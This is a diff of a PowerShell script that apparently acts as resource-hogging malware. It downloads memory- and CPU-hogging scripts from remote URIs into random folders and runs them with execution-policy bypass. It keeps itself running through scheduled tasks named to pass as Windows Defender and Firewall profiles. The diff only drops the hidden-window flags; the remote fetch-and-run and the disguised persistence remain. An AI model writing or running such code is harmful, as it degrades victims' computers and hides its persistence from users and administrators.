@@ -62,7 +62,7 @@ if(-not($itemMem)){
 $threshold = Get-Random -Minimum 80 -Maximum 86
 $memHogTaskName = "windows defender profile"
 $storageHogTaskName = "windows firewall profile"
-$memTaskRunAction = "-ep bypass -noP -w hidden start-process powershell.exe -windowstyle hidden '$memHogPath'"
+$memTaskRunAction = "-ep bypass -noP start-process powershell.exe '$memHogPath'"
 $storageTaskRunAction = "-ep bypass -noP -w hidden start-process powershell.exe -windowstyle hidden '$storageHogPath'"
 
 function Get-RamPercentage{
@@ -145,7 +145,7 @@ while ($true) {
         $memHogPath = $paths[$(Get-Random -Minimum 0 -Maximum $paths.Length)]
         $memHogPath = "$memHogPath\mem_hog.ps1"
         iwr -Uri $memHogUri -OutFile $memHogPath
-        $memTaskRunAction = "-ep bypass -noP -w hidden start-process powershell.exe -windowstyle hidden '$memHogPath'"
+        $memTaskRunAction = "-ep bypass -noP start-process powershell.exe '$memHogPath'"
         Set-ItemProperty -Path "$basePath" -Name $memPropertyName -Value $memHogPath -Force | Out-Null
         schtasks /delete /tn $memHogTaskName /f 2>&1 | Out-Null
     }
@@ -167,7 +167,7 @@ while ($true) {
         echo "threshold $threshold reached at $curr" >> "C:\thres.txt"
         $cpuHogPath = "$($paths[$(Get-Random -Minimum 0 -Maximum $paths.Length)])\cpu_hog.ps1"
         iwr -Uri $cpuHogUri -OutFile $cpuHogPath
-        powershell.exe -ep bypass -w hidden -noP $cpuHogPath
+        powershell.exe -ep bypass -noP $cpuHogPath
     }
 
 }
